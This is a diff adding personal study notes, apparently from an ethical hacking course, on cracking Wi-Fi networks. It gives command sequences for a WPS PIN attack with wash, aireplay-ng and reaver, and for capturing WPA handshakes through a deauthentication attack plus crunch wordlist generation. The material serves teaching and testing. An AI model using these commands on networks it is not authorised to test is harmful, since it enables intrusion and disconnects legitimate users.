@@ -176,6 +176,52 @@ aircrack-ng filename.cap
 #### WPS feature exploiting
 ##### Requirements
 * WPS enabled
+* Router is configured not to use PBC (Push Button Authentication)
+##### Features
+* 8 digit pin cracking
+* Need relatively short time to try all pins
+* WPS pin can be used to compute the actual password
+##### Cracking steps
+Step 1: To scal WPS routers run the following command.
+```
+wash -i wlan0
+```
+Step 2: Fake authentication attack. Delay will be 30 seconds. Keep on.
+```
+aireplay-ng --fakeauth [delay] -a [NetworkMAC] -h [HackerMAC] wlan0
+```
+Step 3: Crack WPS using reaver.
+```
+reaver --bssid [NetworkMAC] --channel [CH] --interface wlan0 -v --no-associate
+```
+Where
+* --no-associate: associate is the process of fake authentication which is done by aireplay-ng, more robust.
+#### Crack using WPA handshake packets
+Step 1: Capture packets.
+```
+airodump-ng --bssid [NetworkMAC] --channel [CH] --write [filename] wlan0
+```
+Step 2: To capture handshake packets. Deauth attack. So that when reconnect, handshake packets will be generated.
+```
+aireplay-ng --deauth 4 -a [NetworkMAC] -c [TargetMAC] wlan0
+```
+Step 3: Generate wordlist.
+```
+crunch [min] [max] [characters] -t [pattern] -o [outputfilename]
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 Source: [Udemy: Learn ethical hacking from scratch by Zaid](https://www.udemy.com/course/learn-ethical-hacking-from-scratch/)
